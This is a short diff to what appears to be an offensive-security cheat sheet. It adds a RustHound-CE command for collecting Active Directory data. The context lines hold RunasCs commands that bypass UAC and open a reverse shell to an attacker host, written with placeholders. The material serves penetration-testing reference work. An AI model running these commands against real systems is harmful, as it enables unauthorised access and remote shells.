@@ -154,6 +154,7 @@ Thank you for reading.
 		- [rpcclient](#rpcclient)
 		- [Rubeus](#rubeus)
 		- [RunasCs](#runascs)
+		- [RustHound-CE](#rusthound-ce)
 		- [Seatbelt](#seatbelt)
 		- [Shadow Credentials](#shadow-credentials)
 		- [smbpasswd](#smbpasswd)
@@ -8002,6 +8003,12 @@ srvinfo
 .\RunasCs.exe <USERNAME> <PASSWORD> <FILE> --bypass-uac -l 5 -b
 .\RunasCs.exe -d <DOMAIN> "<USERNAME>" '<PASSWORD>' cmd.exe -r <LHOST>:<LPORT>
 .\RunasCs.exe -l 3 -d <DOMAIN> "<USERNAME>" '<PASSWORD>' 'C:\Users\<USERNAME>\Downloads\<FILE>'
+```
+
+#### RustHound-CE
+
+```shell
+rusthound-ce -d <DOMAIN> -f <RHOST> -k -c All --zip
 ```
 
 #### Seatbelt
